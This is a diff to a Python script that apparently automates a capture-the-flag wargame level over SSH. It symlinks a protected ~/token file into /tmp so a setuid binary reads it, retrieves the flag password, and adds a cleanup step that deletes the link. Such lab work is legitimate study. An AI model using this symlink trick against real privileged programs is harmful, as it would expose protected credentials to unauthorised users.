@@ -2,7 +2,7 @@ import sys
 
 sys.path.append("../..")
 
-from utils.ssh import connect_by_previous, exec, save_token, get_token
+from utils.ssh import connect_by_previous, exec, get_token
 from utils.text import print_title, print_output
 
 client = connect_by_previous()
@@ -18,10 +18,12 @@ output = exec(client, './level08 token', title='Try to execute with token file')
 print_output(output, 'Output')
 print_title('Not access to read')
 
-output = exec(client, 'ln -s ~/token /tmp/tricky_thing', title='Try to symbol link trick')
+exec(client, 'ln -s ~/token /tmp/tkn', title='Try to symbol link trick')
 
-flag_password = exec(client, './level08 /tmp/tricky_thing', title='Execute with our link file')[0]
+flag_password = exec(client, './level08 /tmp/tkn', title='Execute with our link file')[0]
 print_output(flag_password, 'Output')
+
+exec(client, 'rm -f /tmp/tkn', title='Remove tmp file')
 
 get_token(flag_password)
 
